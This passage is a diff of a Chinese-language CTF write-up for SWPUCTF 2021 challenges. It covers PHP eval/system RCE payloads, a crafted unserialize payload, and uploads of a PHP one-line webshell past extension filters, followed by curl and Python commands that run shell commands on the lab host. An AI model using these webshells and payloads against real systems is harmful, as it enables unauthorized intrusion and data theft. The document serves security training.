@@ -122,7 +122,7 @@ table_schema这是 `information_schema.tables` 表中的一个列，表示表所
 
 补充：
 
-5.[SWPUCTF 2021 新生赛]easyrce
+6.[SWPUCTF 2021 新生赛]easyrce
 
 题目介绍是rce漏洞，rce为远程代码执行漏洞，观察代码可以得到
 
@@ -159,7 +159,7 @@ $command : 要执⾏的命令。
 需要注意的是，使⽤ system() 或其他⽤于执⾏外部命令的函数时必须⾮常⼩⼼，特别是
 当命令中包含⽤户提供的数据时。否则，你的应⽤程序将容易受到命令注⼊攻击。
 
-6.[SWPUCTF 2021 新生赛]caidao
+7.[SWPUCTF 2021 新生赛]caidao
 
 观察代码是一个用利用post请求的rce漏洞，eval函数导致的
 
@@ -172,7 +172,7 @@ wllm=system("ls /");
 wllm=system("cat /flag");
 ```
 
-7.[SWPUCTF 2021 新生赛]Do_you_know_http
+8.[SWPUCTF 2021 新生赛]Do_you_know_http
 
 关于http协议的题
 
@@ -204,7 +204,7 @@ X-Forwarded-For:127.0.0.1    （这个语句放在第三行左右，放在最后
 
 访问./secretttt.php得到flag
 
-8.[SWPUCTF 2021 新生赛]babyrce
+9.[SWPUCTF 2021 新生赛]babyrce
 
 观察代码，可以得到，我们要首先把cookie中admin的值设为1
 
@@ -256,3 +256,183 @@ cat,flag.php(用逗号当作空格)
 ```
 
 得到flag
+
+10.[SWPUCTF 2021 新生赛]ez_unserialize
+
+![1743126109221](image/NSS/1743126109221.png)
+
+先查看源代码，看到代码最后面的注释，发现是robots.txt的内容，查看robots.txt
+
+```
+/?robots.txt
+```
+
+![1743126349036](image/NSS/1743126349036.png)
+
+查看/?cl45s.php
+
+![1743126450149](image/NSS/1743126450149.png)
+
+终于找到了题目的源代码！（反序列化的题目)
+
+阅读源代码，看到原码中将admin初始化为user，passwd初始化为123456
+
+但是__destruct()函数中需要使得admin=admin,passwd=ctf才能得到flag
+
+看到代码后面可以用get方法输入p，并且传入unserialize()函数
+
+经查询unserialize（)函数是用来进行反序列化的
+
+**序列化（Serialization）** 是将对象转换为字符串的过程，方便存储或传输；**反序列化（Unserialization）** 是将字符串还原为对象。
+
+然后我们尝试构造一个序列化的语句然后传入unserialize（)函数执行
+
+```
+/*
+$xx = new wllm()
+$xx -> admin = "admin"
+$xx -> passwd = "ctf"
+*/这短代码用在原文
+
+非原文
+class wllm()
+{
+	public $admin = "admin";
+	public $passwd = "ctf";
+}
+$xx = new wllm();
+$gw = serialize($xx);
+echo $gw;
+
+```
+
+非原文构造
+
+![1743128340166](image/NSS/1743128340166.png)
+
+原代码只需要重新创建一个wllm类然后赋值，进行序列话输出
+
+![1743128452826](image/NSS/1743128452826.png)
+
+ok，现在我们得到了一个序列化后的代码，用get方法传入
+
+```
+?p=O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}⏎  
+```
+
+ 反序列化后对象满足 `__destruct()` 条件，输出flag。
+
+补充！
+
+ `__construct()`是原程序的默认赋值操作，但是反序列化生成的对象的属性值直接覆盖了类定义中的默认值（如果有），但实际是**绕过**了构造函数中的赋值逻辑，原程序的赋值操作被跳过了，反序列话优先级高
+
+**__destruct() 的核心特性**
+
+**触发时机**
+
+当对象的生命周期结束时（例如脚本执行完毕）。
+
+当对象被显式销毁（如调用 `unset($obj)`）。
+
+**反序列化场景** ：反序列化生成的临时对象会在脚本结束时触发 `__destruct()`。
+
+**常见用途**
+
+清理资源（如关闭数据库连接、释放文件句柄）。
+
+在反序列化漏洞中，它是触发恶意代码的关键入口。
+
+**与构造函数的对比**
+
+`__construct()`：对象**创建时**调用（反序列化时不会触发）。
+
+`__destruct()`：对象**销毁时**调用（反序列化时会触发）。
+
+11.[SWPUCTF 2021 新生赛]easyupload2.0
+
+进入一看这是一个文件上传的题目
+
+![1743132923703](image/NSS/1743132923703.png)
+
+尝试一句话木马(one.php)
+
+```
+<?php
+@eval($_POST['cmd']);
+?>
+```
+
+上传失败，提示php是不行的
+
+修改后缀one.phtml                (php3，php5，pht，phtml，phps都是php可运行的文件扩展名)
+
+修改后上传成功
+
+然后想办法getshell
+
+可以使用linux的bash命令行
+
+```
+
+curl -X POST -d "cmd=system("ls");"http://node4.anna.nssctf.cn:28791/upload/one.phtml
+发现可以使用木马
+curl -X POST -d "cmd=system("pwd")"http://node4.anna.nssctf.cn:28791/upload/one.phtml"
+curl -X POST -d "cmd=system("ls /")"http://node4.anna.nssctf.cn:28791/upload/one.phtml"
+curl -X POST -d "cmd=system("pwd")"http://node4.anna.nssctf.cn:28791/upload/one.phtml"
+curl -X POST -d "cmd=system("ls /app")"http://node4.anna.nssctf.cn:28791/upload/one.phtml"
+curl -X POST -d "cmd=system("cat /app/flag.php")"http://node4.anna.nssctf.cn:28791/upload/one.phtml"
+得到flag
+```
+
+或者可以使用python来构造请求
+
+```
+import requests
+
+url = "http://node4.anna.nssctf.cn:28791/upload/one.phtml"
+data = {"cmd": "system('cat /app/flag.php"}
+
+response = requests.post(url, data=data)
+
+print(response.text)
+```
+
+或者可以使用其他的一些工具，例如蚁剑
+
+12. [SWPUCTF 2021 新生赛]easyupload1.0
+
+进入网站发现是一个文件上传的页面
+
+尝试上传一句话木马（one1.0.php)
+
+```
+<?php
+@eval($_POST['cmd']);
+?>
+```
+
+发现上传失败，尝试使用其他php文件的后缀（php3，phtml)，发现都被过滤了尝试将后缀改为.jpg
+
+发现可以上传但是jpg文件没用，所以在bs上对上传操作进行抓包，并将jpg后缀改为php
+
+![1744038937824](image/NSS/1744038937824.png)
+
+显示上传成功，需要getshell来寻找flag
+
+通过linux的bash命令行来getshell
+
+```
+curl -X POST -d "cmd=system('pwd');"http://node7.anna.nssctf.cn:27834/upload/one1.0.php
+curl -X POST -d "cmd=system('ls /app');"http://node7.anna.nssctf.cn:27834/upload/one1.0.php
+发现flag.php
+curl -X POST -d "cmd=system('cat /app/flag.php');"http://node7.anna.nssctf.cn:27834/upload/one1.0.php
+cat到flag，但是发现是一个假的flag
+curl -X POST -d "cmd=system('env');"http://node7.anna.nssctf.cn:27834/upload/one1.0.php
+查看环境变量寻找线索
+```
+
+发现flag就在环境变量中
+
+![1744039433271](image/NSS/1744039433271.png)
+
+！注意环境变量中也可以寻找线索
